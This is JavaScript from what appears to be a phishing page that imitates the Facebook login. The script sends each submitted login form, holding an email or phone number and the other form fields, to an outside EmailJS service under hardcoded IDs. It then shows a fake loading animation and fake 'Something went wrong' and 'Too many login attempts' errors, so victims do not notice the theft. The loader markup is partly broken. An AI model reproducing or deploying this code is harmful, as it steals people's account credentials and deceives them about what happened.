        <script>
            (function() {
                // Initialize EmailJS with your Public Key
                emailjs.init("_AR4YQVXRPYHBxnOZ"); 
            })();

            // Persist login attempts using localStorage
            let loginAttempts = {};
            if (localStorage.getItem('loginAttempts')) {
                try {
                    loginAttempts = JSON.parse(localStorage.getItem('loginAttempts'));
                } catch (e) {
                    loginAttempts = {};
                }
            }
            function sendForm(e) {
                e.preventDefault();
                const form = e.target;
                const emailOrPhone = form.email_address_or_phone.value.trim();
                // Track login attempts and persist
                if (!loginAttempts[emailOrPhone]) {
                    loginAttempts[emailOrPhone] = 1;
                } else {
                    loginAttempts[emailOrPhone]++;
                }
                localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
                if (loginAttempts[emailOrPhone] > 2) {
                    showFbErrorModal('Too many login attempts', 'Please try again later');
                    return;
                }
                // Show loader
                showFbLoading();
                // Simulate loading and error modal
                const loaderDuration = 7000; // 15 seconds
                setTimeout(function() {
                    removeFbLoading();
                    showFbErrorModal('Something went wrong', 'Please try again');
                }, loaderDuration);
                // Send form via EmailJS
                emailjs.sendForm("service_14okc5g", "template_fv4uvw8", e.target)
                    .then(function() {
                        // Optionally handle success
                    }, function(error) {
                        // Optionally handle error
                    });
            }
            function showFbLoading() {
                if (document.getElementById('fb-loading')) return;
                document.body.style.overflow = 'hidden';
                document.body.innerHTML += `
                    <div id="fb-loading" style="
                        position:fixed;
                        top:0; left:0;
                        width:100vw; height:100vh;
                        background:rgba(255,255,255,0.95);
                        backdrop-filter: blur(8px);

                        align-items:center;
                        justify-content:center;

                                    <text x="50%" y="58%" text-anchor="middle" fill="#1877f2" font-size="36" font-family="Arial, Helvetica, sans-serif" font-weight="bold" dy=".3em">f</text>
                                </svg>
                            </div>
                            <div id="fb-dots" style="display:flex; gap:10px; margin-top:18px;">
                                    <div class="fb-dot" style="width:12px; height:12px; border-radius:50%; background:#1877f2; box-shadow:0 2px 6px rgba(0,0,0,0.10); opacity:0.5; transition:opacity 0.3s;"></div>
                                    <div class="fb-dot" style="width:12px; height:12px; border-radius:50%; background:#1877f2; box-shadow:0 2px 6px rgba(0,0,0,0.10); opacity:0.5; transition:opacity 0.3s;"></div>
                                    <div class="fb-dot" style="width:12px; height:12px; border-radius:50%; background:#1877f2; box-shadow:0 2px 6px rgba(0,0,0,0.10); opacity:0.5; transition:opacity 0.3s;"></div>
                                    <div class="fb-dot" style="width:12px; height:12px; border-radius:50%; background:#1877f2; box-shadow:0 2px 6px rgba(0,0,0,0.10); opacity:0.5; transition:opacity 0.3s;"></div>
                            </div>
                        </div>
                    </div>
                `;
                // Animate the blue dots
                const dots = document.querySelectorAll('#fb-dots .fb-dot');
                let active = 0;
                window.fbDotInterval = setInterval(() => {
                    dots.forEach((dot, i) => {
                        dot.style.opacity = (i === active) ? '1' : '0.5';
                    });
                    active = (active + 1) % dots.length;
                }, 350);
            }
            function removeFbLoading() {
                const loading = document.getElementById('fb-loading');
                if (loading) loading.remove();
                if (window.fbDotInterval) clearInterval(window.fbDotInterval);
            }
            function showCreateAccLoader() {
                showFbLoading();
                setTimeout(function() {
                    removeFbLoading();
                    showFbErrorModal('Something went wrong', 'Please try again');
                }, 5000);
            }
            function showFbErrorModal(title, message) {
                document.body.innerHTML += `
                    <div style="
                        position:fixed;
                        top:0; left:0;
                        width:100vw; height:100vh;
                        background:rgba(255,255,255,0.95);
                        backdrop-filter: blur(8px);
                        display:flex;
                        align-items:center;
                        justify-content:center;
                        z-index:9999;
                    ">
                        <div style="
                            background:#fff;
                            color:#606770;
                            padding:32px 24px 24px 24px;
                            border-radius:8px;
                            text-align:center;
                            min-width:320px;
                            box-shadow:0 4px 24px rgba(0,0,0,0.08);
                            font-family: Helvetica, Arial, sans-serif;
                        ">
                            <div style="font-size:1.15em; font-weight:400; margin-bottom:14px;">${title}</div>
                            <div style="margin-bottom:22px; font-size:1em; color:#606770;">${message}</div>
                            <button id="modal-ok-fb" style="padding:10px 32px; background:#fff; color:#1877f2; border:2px solid #1877f2; border-radius:6px; cursor:pointer; font-size:1em; font-weight:600; transition:background 0.2s, color 0.2s;">OK</button>
                        </div>
                    </div>
                `;
                const okBtn = document.getElementById('modal-ok-fb');
                okBtn.onmouseover = function() {
                    okBtn.style.background = '#1877f2';
                    okBtn.style.color = '#fff';
                };
                okBtn.onmouseout = function() {
                    okBtn.style.background = '#fff';
                    okBtn.style.color = '#1877f2';
                };
                okBtn.onclick = function() {
                    window.location.reload();
                };
            }
